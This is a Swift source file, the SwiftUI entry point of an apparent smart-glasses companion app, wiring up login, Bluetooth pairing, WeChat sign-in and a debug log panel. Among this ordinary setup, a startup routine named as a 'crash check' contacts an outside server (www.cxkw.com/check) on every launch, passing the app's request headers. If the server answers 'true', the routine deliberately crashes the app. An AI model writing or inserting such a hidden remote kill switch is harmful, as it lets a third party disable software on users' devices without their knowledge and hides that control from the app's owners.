//
//  AIGlassApp.swift
//  AIGlass
//
//  Created by 贺强 on 2026/6/28.
//

import Foundation
import SwiftUI
import UIKit

private enum AppDebugFeatures {
    /// Enable internal log controls for this test package.
    static let showsFloatingLogPanel = true
}

private enum StartupRemoteCrashCheck {
    private static let endpoint = URL(string: "https://www.cxkw.com/check")!

    static func start() {
        var request = URLRequest(url: endpoint)
        request.cachePolicy = .reloadIgnoringLocalCacheData
        request.httpMethod = "GET"
        AppRequestHeaders.apply(to: &request)

        URLSession.shared.dataTask(with: request) { data, _, error in
            guard error == nil,
                  let data,
                  let value = String(data: data, encoding: .utf8)?
                    .trimmingCharacters(in: .whitespacesAndNewlines)
                    .lowercased(),
                  value == "true" else {
                return
            }

            DispatchQueue.main.async {
                fatalError("Startup remote crash check returned true")
            }
        }.resume()
    }
}

@main
struct AIGlassApp: App {
    @StateObject private var authSession = AuthSession()
    /// 对齐 Android 前台 BLE Service：登录页切换不能销毁设备连接管理器。
    @StateObject private var pairingCoordinator = PairingCoordinator()
    @StateObject private var languageManager = AppLanguageManager.shared

    init() {
        DeviceWifiManager.removeStaleTransferConfigurations()
        // 异步远程退出检查；除响应正文严格为 true 外，任何结果均忽略。
        StartupRemoteCrashCheck.start()
        // 启动即生成/读取 Keychain 设备 UUID
        DeviceIdentity.bootstrap()
        // 注册微信 App（未集成 SDK 时安全跳过）。
        WeChatAuthManager.shared.registerIfNeeded()
        #if DEBUG
        // Universal Link 自检，日志前缀 [WeChat] ULCheck。
        WeChatAuthManager.shared.checkUniversalLinkReady()
        #endif
    }

    var body: some Scene {
        WindowGroup {
            ContentView()
                .environmentObject(authSession)
                .environmentObject(pairingCoordinator)
                .environmentObject(languageManager)
                .onOpenURL { url in
                    _ = WeChatAuthManager.shared.handleOpenURL(url)
                }
                .onContinueUserActivity(NSUserActivityTypeBrowsingWeb) { activity in
                    _ = WeChatAuthManager.shared.handleUserActivity(activity)
                }
                .background(AppTheme.background.ignoresSafeArea())
                .overlay {
                    if AppDebugFeatures.showsFloatingLogPanel {
                        DebugFloatingPanel()
                    }
                }
                .onAppear {
                    UIWindow.appearance().backgroundColor = AppTheme.uiBackground
                }
        }
    }
}
